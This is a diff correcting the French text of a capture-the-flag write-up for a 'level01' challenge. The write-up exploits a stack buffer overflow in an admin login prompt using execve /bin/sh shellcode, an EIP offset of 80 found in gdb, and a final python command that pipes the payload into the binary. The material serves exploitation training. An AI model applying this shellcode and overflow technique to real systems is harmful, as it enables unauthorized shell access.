@@ -1,21 +1,22 @@
 ### level01
 
-Dans ce code, nous retrouvons donc 2 variable qui sont remplis par l utilisateurs :
+Dans ce code, nous retrouvons donc 2 variables qui sont remplies par l'utilisateur :
+
 ```c
 char username[256];
 char password[100];
 ```
 
-L objectif va etre de remplir la 1ere avec un code que nous allons injecter, puis dans la 2nd mettre une redirection afin de le guider vers le code injectee.
+L'objectif va être de remplir la première avec un code que nous allons injecter, puis dans la seconde mettre une redirection afin de le guider vers le code injecté.
 La fonction que nous allons injecter est un execve avec le code suivant :
 
 ```bash
     dat_will\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
 ```
 
-Afin de passer par la suite il faut que le user commence par ``dat_wil`` sinon le programme s arrete.
+Afin de passer à la suite, il faut que l'utilisateur commence par ``dat_wil``, sinon le programme s'arrête.
 
-Il ne nous reste plus qu a chercher l offset requis afin d oferflow depuis password
+Il ne nous reste plus qu'à chercher l'offset requis afin de provoquer un débordement depuis le mot de passe.
 
 ```bash
 ********* ADMIN LOGIN PROMPT *********
@@ -47,18 +48,18 @@ fs             0x0	0
 gs             0x63	99
 ```
 
-Si nous prennons la valeur de eip ( ``0x37634136``) nous avons donc un offset de 80.
-Il ne nous reste plus qu a trouver l addresse du debut de notre injection, afin de l executer.
-Elle est donc stocker 8 bits plus loins que le debut de username
+Si nous prenons la valeur de eip ( ``0x37634136``) nous avons donc un offset de 80.
+Il ne nous reste plus qu'à trouver l'adresse du début de notre injection afin de l'exécuter.
+Elle est donc stockée 8 bits plus loin que le début de username.
 
 avec un objdump nous retrouvons ceci
 ```bash
 0804a040 g     O .bss	00000064              a_user_name
 ```
 
-L addressede dat_will sera donc de 7 case plus loin, soit en ``0x804a047``
+L'adresse de dat_will sera donc de 7 cases plus loin, soit en ``0x804a047``.
 
-Il ne nous reste plus qu a executer avec cette commande final : 
+Il ne nous reste plus qu'à exécuter avec cette commande finale :
 
 ```bash
 (python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
